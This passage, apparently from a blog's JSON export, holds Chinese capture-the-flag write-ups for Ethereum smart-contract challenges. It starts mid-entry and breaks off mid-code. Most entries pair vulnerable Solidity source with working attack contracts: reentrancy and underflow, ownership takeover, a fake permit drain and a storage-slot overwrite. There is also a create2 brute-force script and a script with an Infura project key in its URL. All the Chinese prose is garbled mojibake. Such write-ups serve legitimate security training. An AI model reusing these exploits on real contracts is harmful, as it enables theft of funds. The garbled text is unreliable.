å°†åˆçº¦ä½™é¢è½¬è´¦ç»™ownerï¼Œå¤±è´¥åˆ™revertï¼ŒæˆåŠŸåˆ™ä¸€å®šä¼šé€’å½’è‡³label_043D\nlabel_043D:\n                            var temp9 = var8;\n                            var6 = temp9 + var6;\n                            var7 = temp9 &amp; 0x1f;\n                        \n                            if (!var7) &#123;\n                                var temp10 = memory[0x40:0x60];\n                                log(memory[temp10:temp10 + var6 - temp10], [stack[-8]]);\n                                return;\n                            &#125; else &#123;\n                                var temp11 = var7;\n                                var temp12 = var6 - temp11;\n                                memory[temp12:temp12 + 0x20] = ~(0x0100 ** (0x20 - temp11) - 0x01) &amp; memory[temp12:temp12 + 0x20];\n                                var temp13 = memory[0x40:0x60];\n                                log(memory[temp13:temp13 + (temp12 + 0x20) - temp13], [stack[-8]]);\n                                return;\n                            &#125;\n                        &#125;\n\nä¹Ÿå°±æ˜¯å¦‚ä¸Šå‡½æ•°ï¼Œæ‰§è¡Œäº†emitï¼Œæ‰€ä»¥é‡å†™åˆçº¦å¾—åˆ°å¦‚ä¸‹\ncontract babybet&#123;\n    mapping(address=>uint)public balanceOf;\n    mapping(address=>bool)public statusOf;\n    address private diao;\n    event sendflag();\n\n    function transferbalance(address to,uint value)public&#123;\n        require(balanceOf[msg.sender]>=value);\n        balanceOf[msg.sender]-=value;\n        balanceOf[to]+=value;\n    &#125;\n    \n    function profit() public&#123;\n        require(!statusOf[msg.sender]);\n        balanceOf[msg.sender]+=10;\n        statusOf[msg.sender]=true;\n    &#125;\n\n    function bet(uint arg0)public&#123;\n        require(balanceOf[msg.sender]>=10);\n        balanceOf[msg.sender]-=10;\n        bytes32 var0=blockhash(block.number - 1);\n        uint var1=uint(var0)%3;\n        if(var1!=arg0)&#123;\n           statusOf[msg.sender]=bool(byte(0x02)); \n        &#125;else&#123;\n            balanceOf[msg.sender]+=1000;\n            statusOf[msg.sender]=bool(byte(0x02));\n        &#125;\n    &#125;\n\n    function payforflag(string arg0, string arg1)public&#123;\n        require(balanceOf[msg.sender]>=1000000);\n        (success,)=diao.call.gas(2300).value(address(this).balance);\n        require(success);\n        emit sendflag();\n        &#125;\n\n    function balance(address account)public view returns(uint)&#123;\n        return balanceOf[account];\n    &#125;\n    function status(address account)public view returns(bool)&#123;\n        return statusOf[account];\n    &#125;\n&#125;\n\nä¸€æ¬¡betå¾—1000ï¼Œéœ€è¦1000000token\nå‰©ä¸‹çš„éƒ¨åˆ†å°±æ˜¯è–…ç¾Šæ¯›äº†\nAttackcontract helper&#123;\n    constructor()public&#123;\n        babybet target=babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);\n        bytes32 var0=blockhash(block.number - 1);\n        uint var1=uint(var0)%3;\n        target.profit();\n        target.bet(var1);\n        target.transferbalance(msg.sender,1000);\n    &#125;\n&#125;\n\ncontract attack&#123;\n    function pwn(uint times) public&#123;\n        for(uint i=0;i&lt;times;i++) \n        new helper();\n    &#125;\n    function solve() public&#123;\n        babybet target=babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);\n        target.payforflag(\"bcYng\",\"nb\");\n    &#125;\n&#125;\n\nstorageCode// pragma solidity ^0.4.2;\ncontract cow&#123;\n    address public owner_1;\n    address public owner_2;\n    address public owner_3;\n    address public owner;\n    mapping(address => uint) public balance;\n\n    struct hacker &#123;\n        address hackeraddress1;\n        address hackeraddress2;\n    &#125;\n    hacker  h;\n\n    constructor()public&#123;\n        owner = msg.sender;\n        owner_1 = msg.sender;\n        owner_2 = msg.sender;\n        owner_3 = msg.sender;\n    &#125;\n\n    event SendFlag(string b64email);\n\n\n    function payforflag(string memory b64email) public\n    &#123;\n        require(msg.sender==owner_1);\n        require(msg.sender==owner_2);\n        require(msg.sender==owner_3);\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n\n    function Cow() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        if (geteth==1)\n        &#123;\n            owner_1=msg.sender;\n        &#125;\n    &#125;\n\n    function cov() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        if (geteth&lt;1)\n        &#123;\n            hacker fff=h;\n            fff.hackeraddress1=msg.sender;\n        &#125;\n        else\n        &#123;\n            fff.hackeraddress2=msg.sender;\n        &#125;\n    &#125;\n\n    function see() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        balance[msg.sender]+=geteth;\n        if (uint(msg.sender) &amp; 0xffff == 0x525b)\n        &#123;\n            balance[msg.sender] -= 0xb1b1;\n        &#125;\n    &#125;\n\n    function buy_own() public\n    &#123;\n        require(balance[msg.sender]>1000000);\n        balance[msg.sender]=0;\n        owner_3=msg.sender;\n    &#125;\n\n&#125;\n\nAnalyseæ²¡å•¥å¥½åˆ†æžçš„\nAttackstep1â€“Cowâ€“1 ether\nstep2â€“covâ€“2 ether\nstep3â€“run account\nstep4â€“seeâ€“0 ether\nstep5â€“payforflag\n","slug":"Chain Flag","date":"2022-08-21T08:00:13.497Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"9588ceed135f9fd2fe04406d687effc0","title":"The 2nd Trusted Chain--Blockchain Attack and Defense Competition","content":"æ€»å…±åé“é¢˜ï¼Œæ—¶é—´åŽŸå› æ€»å…±æ‰“äº†äº”é“é¢˜ï¼ˆ4ï¼Œ5ï¼Œ6ï¼Œ8ï¼Œ9ï¼‰ï¼Œä½†æ˜¯å›¢é˜Ÿæˆå‘˜é—´çš„é…åˆï¼Œå®žçŽ°äº†å…¨è§£ï¼ŒåŽç»­å…¶ä»–é¢˜ç›®çš„wpæˆ‘æ—¥åŽæ›´æ–°ä¸Šæ¥\n\n\nOwnerBuyCodepragma solidity ^0.5.0;\nimport \"./contracts/ERC20.sol\";\nimport \"./contracts/IERC20.sol\";\nimport \"./contracts/ERC20Detailed.sol\";\n\n\ninterface Changing &#123;\n    function isOwner(address) external returns (bool);\n&#125;\n\ncontract Ownable &#123;\n    address public _owner;\n    address public _previousOwner;\n\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() internal &#123;\n        address msgSender = msg.sender;\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n\n    //Locks the contract for owner for the amount of time provided\n    function lock() public onlyOwner &#123;\n        _previousOwner = _owner;\n        _owner = address(0);\n        emit OwnershipTransferred(_owner, address(0));\n    &#125;\n\n    //Unlocks the contract for owner when _lockTime is exceeds\n    function unlock() external payable &#123;\n        require(msg.value >= 1 ether);\n        emit OwnershipTransferred(_owner, _previousOwner);\n        _owner = _previousOwner;\n    &#125;\n&#125;\n\n\n\ncontract OwnerBuy is Ownable, ERC20, ERC20Detailed &#123;\n    mapping(address => bool) public status;\n    mapping(address => uint256) public Times;\n    mapping(address => bool) internal whiteList;\n    uint256 MAXHOLD = 100;\n    event finished(bool);\n\n    constructor() public ERC20Detailed(\"DEMO\", \"DEMO\", 18) &#123;&#125;\n\n    function isWhite(address addr) public view returns (bool) &#123;\n        return whiteList[addr];\n    &#125;\n\n    function setWhite(address addr) external onlyOwner returns (bool) &#123;\n        whiteList[addr] = true;\n        return true;\n    &#125;\n\n    function unsetWhite(address addr) external onlyOwner returns (bool) &#123;\n        whiteList[addr] = false;\n        return true;\n    &#125;\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal &#123;\n        _balances[sender] = _balances[sender].sub(amount);\n        _balances[recipient] = _balances[recipient].add(amount);\n        if (!isWhite(recipient)) &#123;\n            require(_balances[recipient] &lt;= MAXHOLD, \"hold overflow\");\n        &#125;\n        emit Transfer(sender, recipient, amount);\n    &#125;\n\n    function changestatus(address _owner) public &#123;\n        Changing tmp = Changing(msg.sender);\n        if (!tmp.isOwner(_owner)) &#123;\n            status[msg.sender] = tmp.isOwner(_owner);\n        &#125;\n    &#125;\n\n    function changeOwner() public &#123;\n        require(tx.origin != msg.sender);\n        require(uint(msg.sender) &amp; 0xffff == 0xffff);\n        if (status[msg.sender] == true) &#123;\n            status[msg.sender] = false;\n            _owner = msg.sender;\n        &#125;\n    &#125;\n\n    function buy() public payable returns (bool success) &#123;\n        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\n        require(tx.origin != msg.sender);\n        require(Times[msg.sender] == 0);\n        require(_balances[msg.sender] == 0);\n        require(msg.value == 1 wei);\n        _balances[msg.sender] = 100;\n        Times[msg.sender] = 1;\n        return true;\n    &#125;\n\n    function sell(uint256 _amount) public returns (bool success) &#123;\n        require(_amount >= 200);\n        require(uint(msg.sender) &amp; 0xffff == 0xffff);\n        require(Times[msg.sender] > 0);\n        require(_balances[msg.sender] >= _amount);\n        require(address(this).balance >= _amount);\n        msg.sender.call.gas(1000000)(\"\");\n        _transfer(msg.sender, address(this), _amount);\n        Times[msg.sender] -= 1;\n        return true;\n    &#125;\n\n    function finish() public onlyOwner returns (bool) &#123;\n        require(Times[msg.sender] >= 100);\n        Times[msg.sender] = 0;\n        msg.sender.transfer(address(this).balance);\n        emit finished(true);\n        return true;\n    &#125;\n\n&#125;\n\nAnalyseemit finished(true)å³å¯èŽ·èƒœ\nè°ƒç”¨finishå‡½æ•°ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ï¼ŒonlyOwnerä»¥åŠrequire(Times[msg.sender] &gt;&#x3D; 100)ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªé™åˆ¶æ¡ä»¶éƒ½æœ‰å¯¹åº”çš„backdoor\né¦–å…ˆsellå‡½æ•°å¯ä»¥é€ æˆTimes[msg.sender]çš„ä¸‹æº¢å¤„ï¼Œä½†æ˜¯ï¼Œä¸€ä¸ªaccountåªèƒ½è¿›è¡Œä¸€æ¬¡buyï¼Œæ‰€ä»¥ï¼Œåªæœ‰ä¸€ä¸ªè´¦æˆ·æ˜¯åšä¸åˆ°ä¸‹æº¢å¤„çš„ï¼ˆcallé‡å…¥ï¼‰ï¼ŒäºŽæ˜¯æƒ³åˆ°äº†è½¬è´¦ï¼Œæœ‰ç‚¹è–…ç¾Šæ¯›çš„å‘³é“ï¼Œåœ¨transferåˆ°åŒä¸€ä¸ªcontractï¼Œæ­¤å¤„åˆæœ‰æ–°çš„é—®é¢˜ï¼Œéžwhitelistæœ‰maxholdé™åˆ¶ã€‚æœ€å¤§100ï¼Œsetwhitelistå‡½æ•°åˆæœ‰onlyOwneré™åˆ¶\næ‰€ä»¥çŽ°åœ¨åªå‰©ä¸‹äº†ä¸€ä¸ªå¾…è§£å†³çš„é™åˆ¶æ¡ä»¶å°±æ˜¯onlyOwnerï¼Œæ”¹å˜owneræœ‰ä¸¤æ­¥ï¼Œå…ˆchangestatuså†changeOwner\nchangestatuså‡½æ•°ä¸­å¯¹äºŽmsg.senderæ²¡æœ‰é™åˆ¶ï¼Œæ‰€ä»¥tmp.isOwnerå¯ä»¥å…ˆè¿”å›žfalseå†è¿”å›žtrueï¼Œæ­¤æ—¶ status[attack contract]å·²ç»ä¸ºtrue\næŽ¥ä¸‹æ¥è¿›è¡ŒchangeOwnerï¼Œç¬¬ä¸€ä¸ªé™åˆ¶æ¡ä»¶å› ä¸ºä½¿ç”¨çš„åˆçº¦æ”»å‡»ï¼Œè‡ªç„¶å°±ä¼šç»•è¿‡ï¼Œç¬¬äºŒä¸ªæ¡ä»¶å°±æ˜¯åœ¨è€ƒcreate2,è·‘ä¸€ä¸ªåˆçº¦åœ°å€å°±å¥½äº†\nAttackcontract helper&#123;\n    address public owner;\n    constructor()public payable&#123;\n        owner=msg.sender;\n    &#125;\n    function attack1()public payable&#123;\n        OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        tar.transfer(owner,100);\n        address payable target=(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        selfdestruct(target);\n    &#125;\n    function attack2()public payable&#123;\n        OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n        tar.buy.value(1 wei)();\n    &#125;\n&#125;\n\n\ncontract attack&#123;\n    OwnerBuy tar = OwnerBuy(0x146eF4c2e99F984c9aec6f1692bec21648101419);\n    bool public flag=false;\n    helper[3] public secondtar;\n\n    function isOwner(address)public returns (bool)&#123; \n       if(!flag)&#123;\n           flag=true;\n           return false;\n       &#125;\n       else&#123;\n           flag=false;\n           return true;\n       &#125;\n    &#125;\n\n    function step1()public payable&#123;\n        tar.changestatus(address(this));\n        tar.changeOwner();\n        tar.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\n        tar.buy.value(1 wei)();\n        for(uint i=0;i&lt;3;i++)&#123;\n            secondtar[i]=new helper();\n            secondtar[i].attack2.value(133 wei)();\n        &#125;\n    &#125;\n    function step2()public&#123;\n        tar.changestatus(address(this));\n        tar.changeOwner();\n        tar.setWhite(address(this));\n        tar.setWhite(address(tar));\n        for(uint i=0;i&lt;3;i++)&#123;\n            secondtar[i].attack1();\n        &#125;\n    &#125;\n    function step3()public payable&#123;\n        // for(uint x=0;x&lt;2;x++)\n        &#123;tar.sell(200);&#125;\n    &#125;\n    \n    function step4()public&#123;\n        tar.finish();\n    &#125;\n    function() external payable&#123;\n        if(!flag)&#123;\n        tar.sell(200);\n        flag=true;\n        &#125;\n    &#125;\n&#125;\n\n\ncontract Deployer &#123;\n    address public a;\n    bytes code = hex\"æ”»å‡»åˆçº¦çš„bytecode\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\nè·‘åˆçº¦è„šæœ¬\ndeployingAddr='deployeråœ°å€'\ncode='attack contract bytecode'\ns=Web3.keccak(hexstr=code)\na=''.join(['%02x' % b for b in s])\n\nfor i in range(0xffff,0xffffffffffffffff):\n    salt=hex(i)[2:].rjust(64,'0')\n    # print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    print(i,p,p[38:42]=='ffff')\n    if p[38:42]=='ffff':\n        print(salt,p)\n        break\n\n\néƒ¨ç½²deployer\néƒ¨ç½²æ”»å‡»åˆçº¦\nstep1\nstep2\nstep3\nstep4â€“solved\n\nLostAssetsCodepragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport &#123;IERC20Permit, ERC20Permit&#125; from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\ncontract MockWETH is ERC20(\"Wrapped ETH\", \"WETH\") &#123;\n    event Deposit(address indexed dst, uint256 wad);\n    event Withdrawal(address indexed src, uint256 wad);\n    fallback() external payable &#123;\n        deposit();\n    &#125;\n\n    function deposit() public payable &#123;\n        _mint(msg.sender, msg.value);\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n\n    function withdraw(uint256 wad) public &#123;\n        require(balanceOf(msg.sender) >= wad, \"weth: insufficient balance\");\n\n        _burn(msg.sender, wad);\n        (bool success, ) = msg.sender.call&#123;value: wad&#125;(\"\");\n        require(success, \"weth: failed\");\n\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n&#125;\n\n/// @notice Token sWETH\ncontract MocksWETH is ERC20Permit &#123;\n    using SafeERC20 for IERC20;\n\n    address underlying;\n\n    constructor(address _underlying)\n        ERC20(\"WrappedERC20\", \"WERC20\")\n        ERC20Permit(\"WrappedERC20\")\n    &#123;\n        underlying = _underlying;\n    &#125;\n\n    function deposit() external returns (uint256) &#123;\n        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);\n        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);\n        return _deposit(_amount, msg.sender);\n    &#125;\n\n    function deposit(uint256 amount) external returns (uint256) &#123;\n        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);\n        return _deposit(amount, msg.sender);\n    &#125;\n\n    function depositWithPermit(\n        address target,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        address to\n    ) external returns (uint256) &#123;\n        // permit is an alternative to the standard approve call:\n        // it allows an off-chain secure signature to be used to register an allowance.\n        // The permitter is approving the beneficiary to spend their money, by signing the permit request\n        IERC20Permit(underlying).permit(\n            target,\n            address(this),\n            value,\n            deadline,\n            v,\n            r,\n            s\n        );\n        IERC20(underlying).safeTransferFrom(target, address(this), value);\n        return _deposit(value, to);\n    &#125;\n\n    function _deposit(uint256 value, address to) internal returns (uint256) &#123;\n        _mint(to, value);\n        return value;\n    &#125;\n\n    /// @notice withdraw all\n    function withdraw() external returns (uint256) &#123;\n        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);\n    &#125;\n\n    /// @notice withdraw specified `amount`\n    function withdraw(uint256 amount) external returns (uint256) &#123;\n        return _withdraw(msg.sender, amount, msg.sender);\n    &#125;\n\n    function _withdraw(\n        address from,\n        uint256 amount,\n        address to\n    ) internal returns (uint256) &#123;\n        _burn(from, amount);\n        IERC20(underlying).safeTransfer(to, amount);\n        return amount;\n    &#125;\n&#125;\n\n\n\n\n\n\ncontract LostAssets &#123;\n    MockWETH public WETH;\n    MocksWETH public sWETH;\n\n    constructor() payable &#123;\n        require(msg.value >= 1 ether, \"At least 1 ether\");\n\n        WETH = new MockWETH();\n        sWETH = new MocksWETH(address(WETH));\n\n        WETH.deposit&#123;value: msg.value&#125;();\n        // Guaranteed interchangeability of WETH and sWETH\n        WETH.approve(address(sWETH), type(uint256).max);\n        // sWETH.approve(address(WETH), type(uint256).max); // WETH cannot use approval\n        // Deposit half of weth balance\n        sWETH.deposit(msg.value / 2);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        require(WETH.balanceOf(address(this)) == 0);\n        return true;\n    &#125;\n\n&#125;\n\nAnalyseè¦æ±‚ï¼Œä½¿LostAssetsåˆçº¦åœ¨WETHä¸‹çš„ä½™é¢ä¸º0\nsWETåˆçº¦ä¸‹æœ‰å‡½æ•°depositWithPermitï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ç­¾åçš„æ–¹å¼è¿›è¡ŒæŽˆæƒï¼ŒsWETHåˆçº¦ç¡®å®žæœ‰åˆå§‹åŒ–ERC20Permitåˆçº¦ï¼Œä½†æ˜¯æŽˆæƒæ“ä½œä½¿é’ˆå¯¹WETHè€Œè¨€ã€‚\nå®žé™…ä¸Šï¼ŒWETHåˆçº¦æ²¡æœ‰å’ŒERC20Permitåˆçº¦äº§ç”Ÿä»»ä½•è”ç³»ï¼Œæ‰€ä»¥å‡½æ•°ä¸­çš„ IERC20Permit(underlying)è‡ªç„¶ä¹Ÿå°±æ˜¯ä¸€ç©ºåˆçº¦\næ‰€ä»¥åœ¨permitè¿™ä¸€æ­¥æ“ä½œä¸­è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰ä»»ä½•æ¡ä»¶é™åˆ¶ï¼Œè™½ç„¶ç­¾åæŽˆæƒæ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯åœ¨LostAssetsåˆçº¦éƒ¨ç½²æ—¶å·²ç»è¿›è¡Œäº†æŽˆæƒæœ€å¤§å€¼çš„WETHæ•°é‡\næ‰€ä»¥åœ¨æ­¤ä¹‹åŽç»§ç»­æ‰§è¡ŒsafeTransferFromå‡½æ•°è¿›è¡Œdepositï¼Œtoåœ°å€ä¸ºä»»æ„ï¼Œç„¶åŽå³å¯æ¸…ç©ºLostAssetsåˆçº¦çš„WETHä½™é¢å®ŒæˆæŒ‘æˆ˜\nAttack\nstep1â€“permission\nstep2â€“solve\n\nStorageSlotCodeimport \"./StorageSlot.sol\";\n\npragma solidity ^0.8.0;\ncontract Storage1 &#123;\n    uint256 public constant VERSION = 1;\n    address public aaaaa;\n    address public admin;\n\n    bytes32 public constant OPERATOR_ROLE = keccak256(\"OPERATOR_ROLE\");\n\n    // Gas deposits ledger for user\n\n    mapping(address => uint256) public gasDeposits;\n    event SendFlag();\n    event SetLogicContract(bytes32 key, address oldAddress, address newAddress);\n\n    event DepositedGas(address account, uint256 amount);\n\n    event WithdrewGas(address account, uint256 amount);\n\n    // error ZeroValue();\n\n    // error ZeroAmount();\n    // error NoAccess(bytes32 roleid, address account);\n\n    /// @dev Initializer to be used after creation, instead of constructor\n\n    constructor() &#123;\n        admin = address(0x123);\n    &#125;\n\n    function setLogicContract(bytes32 key, address contractAddress) external &#123;\n        // Load the slot\n\n        StorageSlot.AddressSlot storage slot = StorageSlot.getAddressSlot(key);\n\n        // Emit the change event\n\n        emit SetLogicContract(key, slot.value, contractAddress);\n\n        // Assign the new value to the slot\n\n        slot.value = contractAddress;\n    &#125;\n\n    function isComplete() public  &#123;\n        require(admin == msg.sender);\n        require(gasDeposits[msg.sender] >= 9999999999999999999999999999999999);\n        emit SendFlag();\n    &#125;\n\n    function depositGasFor(address account) external payable &#123;\n        depositGas(account, msg.value);\n    &#125;\n\n    function depositGas(address account, uint256 amount) internal &#123;\n        if (amount == 0) revert();\n        //  ZeroValue();\n\n        // The deposited ETH is added to the contract's balance\n\n        // update gasFeeDeposit\n\n        gasDeposits[account] = gasDeposits[account] + amount;\n\n        // emit event\n\n        emit DepositedGas(account, amount);\n    &#125;\n\n    /// @dev Lets user withdraw eth from the gas deposits\n\n    function withdrawGas(uint256 amount) external &#123;\n        if (amount == 0) revert();\n        //  ZeroAmount();\n\n        // If _amount is higher than deposit, withdraw all\n\n        uint256 withdrawAmount = amount > gasDeposits[msg.sender]\n            ? gasDeposits[msg.sender]\n            : amount;\n\n        // Quietly return if there is nothing to withdraw\n\n        if (withdrawAmount == 0) return;\n\n        // Adjust the balance\n\n        gasDeposits[msg.sender] = gasDeposits[msg.sender] - withdrawAmount;\n\n        // Send the ETH to msg.sender\n\n        payable(msg.sender).transfer(withdrawAmount);\n\n        // emit event\n\n        emit WithdrewGas(msg.sender, withdrawAmount);\n    &#125;\n\n    receive() external payable &#123;\n        depositGas(msg.sender, msg.value);\n    &#125;\n\n    modifier onlyAdmin() &#123;\n        require(admin == msg.sender);\n\n        _;\n    &#125;\n&#125;\n\ncontract attack&#123;\n    \n&#125;\n\nStorageSlot.sol\nlibrary StorageSlot &#123;\n    struct AddressSlot &#123;\n        address value;\n    &#125;\n\n    struct BooleanSlot &#123;\n        bool value;\n    &#125;\n\n    struct Bytes32Slot &#123;\n        bytes32 value;\n    &#125;\n\n    struct Uint256Slot &#123;\n        uint256 value;\n    &#125;\n\n    /**\n     * @dev Returns an `AddressSlot` with member `value` located at `slot`.\n     */\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.\n     */\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.\n     */\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n\n    /**\n     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.\n     */\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;\n        /// @solidity memory-safe-assembly\n        assembly &#123;\n            r.slot := slot\n        &#125;\n    &#125;\n&#125;\n\n\nAnalyseå°±æ˜¯åœ¨è€ƒå­˜å‚¨æœºåˆ¶ï¼Œå˜é‡è¦†ç›–\nmappingç±»åž‹æ˜¯keccakï¼ˆslot+keyï¼‰\npsï¼šconstantæœ‰ç‹¬ç‰¹çš„ä¸€å¥—å­˜å‚¨æ–¹å¼ï¼Œå’Œæ™®é€šå˜é‡ä¸åŒ\nAttackcontract attack&#123;\n    Storage1 target=Storage1(payable(0xE2E42Cb218Edb672f35361738eae21827d22BA2e));\n    function GetOwner() public&#123;\n        target.setLogicContract(0x0000000000000000000000000000000000000000000000000000000000000001,address(this));\n    &#125;\n    function IncreaseBalance(bytes32 key)public&#123;\n        target.setLogicContract(key,0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF);\n    &#125;\n    function complete() public &#123;\n        target.isComplete();\n    &#125;\n&#125;\n\nè®¡ç®—gasDepositå­˜å‚¨åœ°å€ï¼š\nfrom web3 import Web3,HTTPProvider\nimport binascii\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/18a393d792ae461489aa663d5d1b3fdf'))\n\ndef byte32(i):\n    return binascii.unhexlify('%064x'%i)\nkey=0x169D04de13b91f03A59a0dA7a3660de096F5B662\nb=(byte32(key)+byte32(2)).hex()\nslot=Web3.keccak(hexstr=b).hex()\nprint(slot)\n\nprint(w3.eth.getStorageAt('0xE2E42Cb218Edb672f35361738eae21827d22BA2e',slot).hex())\n\nstep1â€“GetOwner\nstep2â€“calculate storageAddress\nstep3â€“IncreaseBalanceï¼ˆstorageAddressï¼‰\nstep4â€“complete\nGovernanceCodegovernance\n// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.6.12;\n\nimport \"./interface.sol\";\nimport \"./Masterchef.sol\";\n\ncontract Governance &#123;\n    bool public Flag;\n    address public  ValidatorOwner;\n    mapping (address => uint256) public validatorVotes;\n    mapping (address => bool) public VotingStatus;\n    event Sendflag(bool Flag);\n    MasterChef public masterChef = new MasterChef();\n    string greeting;\n    constructor (string memory _greeting) public &#123;\n        greeting = _greeting;\n    &#125;\n    modifier onlyValidatorOwner() &#123;\n        require(msg.sender == ValidatorOwner, \"Governance: only validator owner\");\n        _;\n    &#125;\n    function vote(address validator) public &#123;\n        require(masterChef.owner() == msg.sender);\n        require(!VotingStatus[msg.sender]);\n        VotingStatus[msg.sender] = true;\n        uint balances = masterChef.balanceOf(msg.sender);\n        validatorVotes[validator] += balances;\n    &#125;\n    function setValidator() public &#123;\n        uint256 votingSupply = masterChef.totalSupply() * 2 / 3;\n        require(validatorVotes[msg.sender] >= votingSupply);\n        ValidatorOwner = msg.sender;\n    &#125;\n\n    function setflag() public onlyValidatorOwner &#123;\n        Flag = true;\n        emit Sendflag(Flag);\n    &#125;\n&#125;\n\nMasterchef\npragma solidity 0.6.12;\n\nimport \"./interface.sol\";\n\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this;\n        return msg.data;\n    &#125;\n&#125;\n\ncontract Ownable is Context &#123;\n    address public _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    \n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\ncontract ERC20 is Context, IERC20 &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor (string memory name, string memory symbol) public &#123;\n        _name = name;\n        _symbol = symbol;\n        _decimals = 1;\n    &#125;\n\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n\n    function totalSupply() public view override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n\n    function allowance(address owner, address spender) public view virtual override returns 